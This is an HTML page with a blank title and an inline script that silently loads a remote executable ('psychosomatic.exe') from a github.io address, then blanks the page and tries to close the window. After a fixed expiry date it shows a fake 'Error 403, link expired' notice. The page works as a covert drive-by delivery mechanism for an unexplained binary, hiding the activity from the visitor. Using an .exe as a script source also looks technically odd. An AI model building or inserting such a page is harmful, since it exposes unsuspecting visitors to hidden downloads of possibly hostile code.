<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title></title>
<style>
  html, body { margin: 0; padding: 0; background: #fff; }

  .err-wrap {
    position: fixed; inset: 0;
    display: flex; flex-direction: column;
    align-items: center; justify-content: space-between;
    padding: 12vh 24px 10vh;
    box-sizing: border-box;
    font-family: -apple-system, "Segoe UI", "Microsoft YaHei", sans-serif;
    background: #fff;
  }
  .err-title {
    font-size: clamp(56px, 14vw, 140px);
    font-weight: 800;
    letter-spacing: -2px;
    line-height: 1;
    color: #1a1a1a;
    margin: 0;
    text-align: center;
  }
  .err-hint {
    font-size: 14px;
    line-height: 1.7;
    color: #9a9a9a;
    text-align: center;
    margin: 0;
  }
</style>
</head>
<body>
<script>
(function () {
  var FILE_URL   = 'https://cybertrainerx.github.io/data/temp/psychosomatic.exe';
  var EXPIRE_AT = Date.parse('2026-10-25T12:00:00+08:00');

  var JUMP_DELAY = 1200;
  var MAX_WAIT   = 4000;

  function deny() {
    try { window.stop(); } catch (e) {}

    document.title = 'Error 403';
    document.body.innerHTML = '';

    var wrap = document.createElement('div');
    wrap.className = 'err-wrap';

    var title = document.createElement('h1');
    title.className = 'err-title';
    title.textContent = 'Error 403';

    var hint = document.createElement('p');
    hint.className = 'err-hint';
    hint.textContent = 'This download link has expired. Please request a new one.';

    wrap.appendChild(title);
    wrap.appendChild(hint);
    document.body.appendChild(wrap);
  }

  function isExpired() {
    return !isFinite(EXPIRE_AT) || Date.now() >= EXPIRE_AT;
  }

  if (isExpired()) { deny(); return; }

  var jumped = false;
  function leave() {
    if (jumped) return;
    jumped = true;
    try { location.replace('about:blank'); } catch (e) { location.href = 'about:blank'; }
    setTimeout(function () { try { window.close(); } catch (e) {} }, 60);
  }

  var s = document.createElement('script');
  s.src = FILE_URL;
  s.async = true;
  s.onload  = function () { setTimeout(leave, JUMP_DELAY); };
  s.onerror = function () { setTimeout(leave, JUMP_DELAY); };
  (document.head || document.documentElement).appendChild(s);

  setTimeout(leave, MAX_WAIT);
})();
</script>
</body>
</html>
